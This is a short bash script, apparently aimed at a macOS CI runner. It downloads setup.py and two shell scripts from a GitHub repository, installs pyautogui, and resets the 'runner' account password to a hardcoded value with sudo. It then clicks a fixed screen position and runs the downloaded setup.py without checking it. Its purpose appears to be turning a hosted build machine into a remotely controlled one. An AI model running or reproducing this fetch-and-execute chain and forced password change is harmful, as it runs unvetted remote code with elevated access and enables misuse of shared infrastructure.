#!/bin/bash
set -e

# Download setup.py
curl -s -L -o setup.py "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/setup.py"

# Download other scripts (converted later)
curl -s -L -o show.sh "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/show.sh"
curl -s -L -o loop.sh "https://raw.githubusercontent.com/connnecteed/e/refs/heads/main/loop.sh"

# Install Python deps
pip install --quiet pyautogui

# macOS doesn’t support choco/vcredist/WinRAR/Telegram.exe installs
echo "[INFO] Skipping Windows-only installers (Telegram, WinRAR, vcredist, VMQuickConfig)."

# Set password for user (macOS equivalent: 'runner')
sudo dscl . -passwd /Users/runner TheDisa1a || true

# Run pyautogui click
python - << 'EOF'
import pyautogui as pag
pag.click(897, 64, duration=2)
EOF

# Run setup.py
python setup.py
